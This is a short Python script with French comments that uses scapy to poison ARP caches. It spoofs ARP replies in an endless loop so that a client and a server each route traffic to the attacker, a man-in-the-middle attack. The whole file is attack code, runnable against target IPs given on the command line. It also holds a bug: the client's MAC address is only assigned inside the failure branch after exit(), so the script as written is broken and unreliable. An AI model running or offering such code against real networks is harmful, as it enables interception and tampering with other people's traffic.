#!/usr/bin/python3

"""Module Utilise pour l'Attaque"""
import sys
import time
from scapy.all import ARP, Ether, srp1, sendp


def atk(ip_client, ip_serveur):
    """Fonctions qui recupere les adresses mac du client et du serveur pour mettre  
    celle de l'attaquant dans leurs tables ARP """
    # recuperation de l'@ MAC du client
    requete = Ether() / ARP(pdst=ip_client)
    reponse = srp1(requete, timeout=5)

    if reponse is None:
        print("Le client n'est pas accessible")
        exit()

        mac_client = reponse[ARP].hwsrc

        print(ip_client, mac_client)

    # recuperation de l'@ MAC du serveur
    requete = Ether() / ARP(pdst=ip_serveur)
    reponse = srp1(requete, timeout=5)

    if reponse is None:
        print("Le serveur n'est pas accessible")
        exit()

    mac_serveur = reponse[ARP].hwsrc

    print(ip_serveur, mac_serveur)

    # on cree le paquet pour attaquer le client
    attaque_client = Ether(dst=mac_client) / ARP(psrc=ip_serveur)

    # on cree le paquet pour attaquer le serveur
    attaque_serveur = Ether(dst=mac_serveur) / ARP(psrc=ip_client)

    while True:
        sendp(attaque_client)
        sendp(attaque_serveur)
        time.sleep(2)

atk(sys.argv[1], sys.argv[2])
